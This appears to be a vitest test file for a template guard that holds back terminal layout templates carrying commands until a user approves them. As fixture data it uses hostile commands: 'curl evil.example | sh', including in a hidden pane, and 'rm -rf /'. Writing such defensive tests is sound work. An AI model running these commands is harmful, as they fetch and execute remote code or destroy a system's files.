import { describe, it, expect, afterEach } from "vitest";
import type { Template } from "./protocol/types.ts";
import {
  commandsIn,
  withoutCommands,
  guardedApplyTemplate,
  onTemplateApprovalRequest,
  type TemplateApprovalRequest,
} from "./template_guard.ts";

function template(panes: Template["panes"]): Template {
  return {
    name: "demo",
    panes,
    layout: { slot: Object.keys(panes) },
  };
}

let unsubscribe: (() => void) | null = null;

afterEach(() => {
  unsubscribe?.();
  unsubscribe = null;
});

/** Capture the approval request instead of showing a dialog. */
function captureRequests(): { last: () => TemplateApprovalRequest | null } {
  let captured: TemplateApprovalRequest | null = null;
  unsubscribe = onTemplateApprovalRequest((req) => {
    captured = req;
  });
  return { last: () => captured };
}

describe("commandsIn", () => {
  it("lists every pane that would execute something", () => {
    const found = commandsIn(
      template({
        editor: { command: "nvim .", dir: "/srv/app", shell_profile: "zsh" },
        plain: {},
        server: { command: "npm run dev" },
      }),
    );

    expect(found).toHaveLength(2);
    expect(found.map((c) => c.command).sort()).toEqual(["npm run dev", "nvim ."]);
    expect(found.find((c) => c.paneName === "editor")).toMatchObject({
      dir: "/srv/app",
      shellProfile: "zsh",
    });
  });

  it("reports nothing for a pure layout template", () => {
    expect(commandsIn(template({ a: {}, b: { dir: "/tmp" } }))).toEqual([]);
  });
});

describe("withoutCommands", () => {
  it("strips commands but keeps the layout and working directories", () => {
    const stripped = withoutCommands(
      template({
        one: { command: "curl evil.example | sh", dir: "/srv", restore_mode: "replay" },
        two: { dir: "/tmp" },
      }),
    );

    expect(commandsIn(stripped)).toEqual([]);
    expect(stripped.panes.one.dir).toBe("/srv");
    expect(stripped.panes.one.restore_mode).toBeUndefined();
    expect(stripped.panes.two.dir).toBe("/tmp");
    expect(stripped.layout).toEqual({ slot: ["one", "two"] });
  });
});

describe("guardedApplyTemplate", () => {
  it("applies a command-free template without asking", () => {
    captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: {} }), (t) => applied.push(t));

    expect(applied).toHaveLength(1);
  });

  /// The core requirement of SR-12: nothing runs before an explicit decision.
  it("does not apply a command-bearing template until approved", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "rm -rf /" } }), (t) => applied.push(t));

    expect(applied).toHaveLength(0);
    expect(requests.last()).not.toBeNull();
    expect(requests.last()!.commands.map((c) => c.command)).toEqual(["rm -rf /"]);
  });

  it("applies the original template when the user approves", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.approveFull();

    expect(commandsIn(applied[0])).toHaveLength(1);
  });

  it("applies a stripped template when the user picks layout only", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.approveLayoutOnly();

    expect(applied).toHaveLength(1);
    expect(commandsIn(applied[0])).toEqual([]);
  });

  it("applies nothing when the user cancels", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.cancel();

    expect(applied).toHaveLength(0);
  });

  /// A hidden pane must not be able to slip past the prompt: the command list is
  /// built from the pane map, not from what the layout happens to render.
  it("reports commands in panes the layout does not reference", () => {
    const t = template({ visible: {} });
    t.panes.hidden = { command: "curl evil.example | sh" };

    const requests = captureRequests();
    guardedApplyTemplate(t, () => {});

    expect(requests.last()!.commands.map((c) => c.command)).toEqual([
      "curl evil.example | sh",
    ]);
  });
});
